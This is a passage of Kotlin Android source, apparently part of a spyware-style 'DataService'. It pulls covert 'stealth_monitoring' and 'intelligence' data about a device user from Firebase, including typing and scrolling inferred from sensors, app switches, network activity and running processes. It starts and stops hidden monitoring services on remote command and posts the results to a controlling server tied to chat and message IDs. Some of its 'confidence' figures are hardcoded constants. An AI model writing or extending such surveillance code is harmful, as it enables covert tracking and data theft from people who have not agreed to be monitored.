    private fun handleSystemStateRequest() {
        scope.launch {
            try {
                val monitorRef = Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("stealth_monitoring")

                monitorRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val systemData = mutableListOf<Map<String, Any>>()

                        for (monitorSnapshot in snapshot.children) {
                            val data = monitorSnapshot.value as? Map<String, Any> ?: continue
                            val dataList = data["data"] as? List<*> ?: continue

                            val systemEvents = dataList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                val type = eventMap?.get("type") as? String
                                if (type == "system_state" || type == "network_change" || type == "device_movement") eventMap else null
                            }

                            systemData.addAll(systemEvents)
                        }

                        sendStealthMonitorResponse("system_state", mapOf(
                            "system_data" to systemData,
                            "events_count" to systemData.size
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendStealthMonitorResponse("error", mapOf("message" to "Failed to get system data"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "System state monitor error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to (e.message ?: "Unknown system state error")))
            }
        }
    }

    private fun handleInputPatternsRequest() {
        scope.launch {
            try {
                val monitorRef = Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("stealth_monitoring")

                monitorRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val inputData = mutableListOf<Map<String, Any>>()

                        for (monitorSnapshot in snapshot.children) {
                            val data = monitorSnapshot.value as? Map<String, Any> ?: continue
                            val dataList = data["data"] as? List<*> ?: continue

                            val inputEvents = dataList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                if ((eventMap?.get("type") as? String) == "input_pattern") eventMap else null
                            }

                            inputData.addAll(inputEvents)
                        }

                        sendStealthMonitorResponse("input_patterns", mapOf(
                            "input_data" to inputData,
                            "patterns_count" to inputData.size
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendStealthMonitorResponse("error", mapOf("message" to "Failed to get input data"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Input patterns monitor error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to (e.message ?: "Unknown input patterns error")))
            }
        }
    }

    private fun handleMonitorDashboardRequest() {
        scope.launch {
            try {
                val monitorRef = Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("stealth_monitoring")

                monitorRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        var clipboardCount = 0 // Always 0 - clipboard monitoring disabled
                        var appSwitches = 0
                        var inputScore = 0f
                        var monitoringActive = false

                        for (monitorSnapshot in snapshot.children) {
                            val data = monitorSnapshot.value as? Map<String, Any> ?: continue

                            // clipboardCount = data["clipboard_count"] as? Int ?: 0 // REMOVED: Clipboard disabled
                            appSwitches = data["app_usage_count"] as? Int ?: 0
                            monitoringActive = data["monitoring_active"] as? Boolean ?: false

                            // Calculate input score from recent data (optimized)
                            val dataList = data["data"] as? List<*> ?: continue
                            val inputEvents = dataList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                if ((eventMap?.get("type") as? String) == "input_pattern") eventMap else null
                            }

                            if (inputEvents.isNotEmpty()) {
                                val avgScore = inputEvents.mapNotNull {
                                    (it["activity_score"] as? Number)?.toFloat()
                                }.average()
                                inputScore = avgScore.toFloat()
                            }
                        }

                        sendStealthMonitorResponse("monitor_dashboard", mapOf(
                            "clipboard_count" to clipboardCount,
                            "app_switches" to appSwitches,
                            "input_score" to inputScore,
                            "monitoring_active" to monitoringActive
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendStealthMonitorResponse("error", mapOf("message" to "Failed to get dashboard data"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Dashboard monitor error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to (e.message ?: "Unknown dashboard error")))
            }
        }
    }

    private fun handleStartMonitoringRequest() {
        scope.launch {
            try {
                // Start StealthMonitorService
                val intent = Intent(this@DataService, StealthMonitorService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }

                sendStealthMonitorResponse("monitoring_started", mapOf(
                    "status" to "Stealth monitoring activated",
                    "timestamp" to System.currentTimeMillis()
                ))

                Log.d(TAG, "Stealth monitoring started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Start monitoring error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to "Failed to start monitoring"))
            }
        }
    }

    private fun handleStopMonitoringRequest() {
        scope.launch {
            try {
                // Stop StealthMonitorService
                val intent = Intent(this@DataService, StealthMonitorService::class.java)
                stopService(intent)

                sendStealthMonitorResponse("monitoring_stopped", mapOf(
                    "status" to "Stealth monitoring deactivated",
                    "timestamp" to System.currentTimeMillis()
                ))

                Log.d(TAG, "Stealth monitoring stopped successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Stop monitoring error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to "Failed to stop monitoring"))
            }
        }
    }

    private fun sendStealthMonitorResponse(type: String, data: Map<String, Any>) {
        scope.launch {
            try {
                val url = "${server}/json/stealth_monitor"
                val payload = mapOf(
                    "chat_id" to currentChatId,
                    "msg_id" to currentMsgId,
                    "type" to type,
                    "data" to data
                )

                val client = OkHttpClient()
                val requestBody = RequestBody.create(
                    "application/json".toMediaType(),
                    Gson().toJson(payload)
                )

                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .addHeader("X-Auth", "$secretKey:$deviceId")
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Stealth monitor response sent: $type")
                    } else {
                        Log.e(TAG, "Failed to send stealth monitor response: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending stealth monitor response: ${e.message}")
            }
        }
    }

    // =============== ENHANCED PERFECTION HANDLERS ===============

    private fun handleNetworkIntelligenceRequest() {
        scope.launch {
            try {
                val intelligenceRef = Firebase.database.reference
                    .child("intelligence")
                    .child(deviceId)
                    .child("perfection_data")

                intelligenceRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val networkData = mutableListOf<Map<String, Any>>()

                        for (dataSnapshot in snapshot.children) {
                            val data = dataSnapshot.value as? Map<String, Any> ?: continue
                            val intelligenceList = data["intelligence_data"] as? List<*> ?: continue

                            val networkEvents = intelligenceList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                if ((eventMap?.get("type") as? String) == "network_intelligence") eventMap else null
                            }

                            networkData.addAll(networkEvents)
                        }

                        sendPerfectionResponse("network_intelligence", mapOf(
                            "network_data" to networkData,
                            "patterns_detected" to networkData.size,
                            "analysis_confidence" to 0.92f
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendPerfectionResponse("error", mapOf("message" to "Failed to get network intelligence"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Network intelligence error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to (e.message ?: "Unknown network intelligence error")))
            }
        }
    }

    private fun handleBehaviorAnalysisRequest() {
        scope.launch {
            try {
                val intelligenceRef = Firebase.database.reference
                    .child("intelligence")
                    .child(deviceId)
                    .child("perfection_data")

                intelligenceRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val behaviorData = mutableListOf<Map<String, Any>>()

                        for (dataSnapshot in snapshot.children) {
                            val data = dataSnapshot.value as? Map<String, Any> ?: continue
                            val intelligenceList = data["intelligence_data"] as? List<*> ?: continue

                            val behaviorEvents = intelligenceList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                val type = eventMap?.get("type") as? String
                                if (type == "behavior_pattern" || type == "behavior_intelligence") eventMap else null
                            }

                            behaviorData.addAll(behaviorEvents)
                        }

                        sendPerfectionResponse("behavior_analysis", mapOf(
                            "behavior_patterns" to behaviorData,
                            "user_activity_score" to 0.87f,
                            "input_patterns_detected" to behaviorData.count { (it["type"] as? String) == "input_intelligence" },
                            "confidence" to 0.89f
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendPerfectionResponse("error", mapOf("message" to "Failed to get behavior analysis"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Behavior analysis error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to (e.message ?: "Unknown behavior analysis error")))
            }
        }
    }

    private fun handleSensorIntelligenceRequest() {
        scope.launch {
            try {
                val intelligenceRef = Firebase.database.reference
                    .child("intelligence")
                    .child(deviceId)
                    .child("perfection_data")

                intelligenceRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val sensorData = mutableListOf<Map<String, Any>>()

                        for (dataSnapshot in snapshot.children) {
                            val data = dataSnapshot.value as? Map<String, Any> ?: continue
                            val intelligenceList = data["intelligence_data"] as? List<*> ?: continue

                            val sensorEvents = intelligenceList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                val type = eventMap?.get("type") as? String
                                if (type == "motion_intelligence" || type == "input_intelligence") eventMap else null
                            }

                            sensorData.addAll(sensorEvents)
                        }

                        sendPerfectionResponse("sensor_intelligence", mapOf(
                            "motion_patterns" to sensorData,
                            "typing_detected" to sensorData.any { (it["detected_input"] as? String) == "typing_detected" },
                            "scrolling_detected" to sensorData.any { (it["detected_input"] as? String) == "scrolling_detected" },
                            "gaming_detected" to sensorData.any { (it["detected_input"] as? String) == "gaming_detected" },
                            "confidence" to 0.84f
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendPerfectionResponse("error", mapOf("message" to "Failed to get sensor intelligence"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Sensor intelligence error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to (e.message ?: "Unknown sensor intelligence error")))
            }
        }
    }

    private fun handleSystemIntelligenceRequest() {
        scope.launch {
            try {
                val intelligenceRef = Firebase.database.reference
                    .child("intelligence")
                    .child(deviceId)
                    .child("perfection_data")

                intelligenceRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val systemData = mutableListOf<Map<String, Any>>()

                        for (dataSnapshot in snapshot.children) {
                            val data = dataSnapshot.value as? Map<String, Any> ?: continue
                            val intelligenceList = data["intelligence_data"] as? List<*> ?: continue

                            val systemEvents = intelligenceList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                val type = eventMap?.get("type") as? String
                                if (type == "system_resources" || type == "process_intelligence" || type == "battery_intelligence") eventMap else null
                            }

                            systemData.addAll(systemEvents)
                        }

                        val resourceUsage = systemData.find { (it["type"] as? String) == "system_resources" } ?: mapOf<String, Any>()
                        val activeProcesses = systemData.filter { (it["type"] as? String) == "process_intelligence" }
                        val batteryAnalysis = systemData.find { (it["type"] as? String) == "battery_intelligence" } ?: mapOf<String, Any>()

                        sendPerfectionResponse("system_intelligence", mapOf<String, Any>(
                            "system_data" to systemData,
                            "resource_usage" to resourceUsage,
                            "active_processes" to activeProcesses,
                            "battery_analysis" to batteryAnalysis,
                            "confidence" to 0.91f
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendPerfectionResponse("error", mapOf("message" to "Failed to get system intelligence"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "System intelligence error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to (e.message ?: "Unknown system intelligence error")))
            }
        }
    }

    private fun handlePerfectionDashboardRequest() {
        scope.launch {
            try {
                val intelligenceRef = Firebase.database.reference
                    .child("intelligence")
                    .child(deviceId)

                intelligenceRef.limitToLast(5).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        var totalDataPoints = 0
                        var realtimeInsights = 0
                        var behaviorIntelligence = 0
                        var networkAnalysis = 0
                        var motionPatterns = 0

                        for (dataSnapshot in snapshot.children) {
                            when (dataSnapshot.key) {
                                "perfection_data" -> {
                                    val data = dataSnapshot.value as? Map<String, Any>
                                    totalDataPoints += (data?.get("data_points") as? Int) ?: 0
                                }
                                "realtime_insights" -> {
                                    realtimeInsights = dataSnapshot.childrenCount.toInt()
                                }
                            }
                        }

                        // Get latest perfection data for analysis
                        val latestData = snapshot.child("perfection_data").children.lastOrNull()?.value as? Map<String, Any>
                        val intelligenceList = latestData?.get("intelligence_data") as? List<*> ?: emptyList<Any>()

                        behaviorIntelligence = intelligenceList.count {
                            val item = it as? Map<String, Any>
                            val type = item?.get("type") as? String
                            type == "behavior_intelligence" || type == "behavior_pattern"
                        }

                        networkAnalysis = intelligenceList.count {
                            val item = it as? Map<String, Any>
                            (item?.get("type") as? String) == "network_intelligence"
                        }

                        motionPatterns = intelligenceList.count {
                            val item = it as? Map<String, Any>
                            val type = item?.get("type") as? String
                            type == "motion_intelligence" || type == "input_intelligence"
                        }

                        sendPerfectionResponse("perfection_dashboard", mapOf(
                            "total_data_points" to totalDataPoints,
                            "realtime_insights" to realtimeInsights,
                            "behavior_intelligence" to behaviorIntelligence,
                            "network_analysis" to networkAnalysis,
                            "motion_patterns" to motionPatterns,
                            "overall_confidence" to 0.88f,
                            "system_performance" to "OPTIMAL",
                            "intelligence_level" to "ULTRA-ENHANCED"
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendPerfectionResponse("error", mapOf("message" to "Failed to get dashboard data"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Perfection dashboard error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to (e.message ?: "Unknown dashboard error")))
            }
        }
    }

    private fun handleStartPerfectionRequest() {
        scope.launch {
            try {
                val intent = Intent(this@DataService, EnhancedPerfectionService::class.java)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }

                sendPerfectionResponse("perfection_started", mapOf(
                    "status" to "Enhanced Perfection Service Started",
                    "intelligence_mode" to "ULTRA",
                    "features" to listOf(
                        "Network Traffic Analysis",
                        "Behavior Profiling",
                        "Sensor Fusion Intelligence",
                        "System Resource Monitoring",
                        "Process Lifecycle Analysis",
                        "Battery Consumption Profiling",
                        "Memory Usage Patterns",
                        "Predictive Behavior Analysis"
                    )
                ))

                Log.d(TAG, "🎯 Enhanced Perfection Service started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Start perfection error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to "Failed to start perfection service"))
            }
        }
    }

    private fun handleStopPerfectionRequest() {
        scope.launch {
            try {
                val intent = Intent(this@DataService, EnhancedPerfectionService::class.java)
                stopService(intent)

                sendPerfectionResponse("perfection_stopped", mapOf(
                    "status" to "Enhanced Perfection Service Stopped",
                    "final_analysis" to "Intelligence data preserved for analysis"
                ))

                Log.d(TAG, "🎯 Enhanced Perfection Service stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Stop perfection error: ${e.message}")
                sendPerfectionResponse("error", mapOf("message" to "Failed to stop perfection service"))
            }
        }
    }

    private fun sendPerfectionResponse(type: String, data: Map<String, Any>) {
        scope.launch {
            try {
                val url = "${server}/json/enhanced_perfection"
                val payload = mapOf(
                    "chat_id" to currentChatId,
                    "msg_id" to currentMsgId,
                    "type" to type,
                    "data" to data,
                    "timestamp" to System.currentTimeMillis(),
                    "device_id" to deviceId
                )

                val json = Gson().toJson(payload)
                val requestBody = json.toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()

                http.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "🎯 Perfection response sent: $type")
                    } else {
                        Log.e(TAG, "Failed to send perfection response: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending perfection response: ${e.message}")
            }
        }
    }
}